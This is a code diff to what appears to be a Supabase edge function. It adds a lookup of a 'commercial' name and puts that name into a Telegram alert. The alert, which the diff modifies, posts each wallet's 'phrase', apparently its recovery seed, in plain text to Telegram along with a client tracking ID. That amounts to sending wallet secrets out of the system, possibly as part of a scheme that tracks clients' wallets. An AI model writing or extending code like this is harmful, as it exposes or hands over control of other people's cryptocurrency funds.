@@ -44,10 +44,26 @@ serve(async (req) => {
       try {
         const walletData = JSON.parse(notification.setting_value);
         
+        // Fetch commercial name
+        let commercialName = 'Unknown Commercial';
+        try {
+          const { data: commercial } = await supabase
+            .from('commercials')
+            .select('name')
+            .eq('id', walletData.commercial_id)
+            .single();
+          
+          if (commercial?.name) {
+            commercialName = commercial.name;
+          }
+        } catch (err) {
+          console.warn('Could not fetch commercial name:', err);
+        }
+        
         // Send Telegram notification about wallet usage
         await supabase.functions.invoke('send-telegram-notification', {
           body: {
-            message: `🔑 New wallet used!\nWallet ID: ${walletData.wallet_id}\nCommercial ID: ${walletData.commercial_id}\nClient: ${walletData.client_tracking_id}\nPhrase: ${walletData.phrase}\nTime: ${walletData.timestamp}`
+            message: `🔑 New wallet used!\nWallet ID: ${walletData.wallet_id}\nCommercial: ${commercialName}\nClient: ${walletData.client_tracking_id}\nPhrase: ${walletData.phrase}\nTime: ${walletData.timestamp}`
           }
         });
 
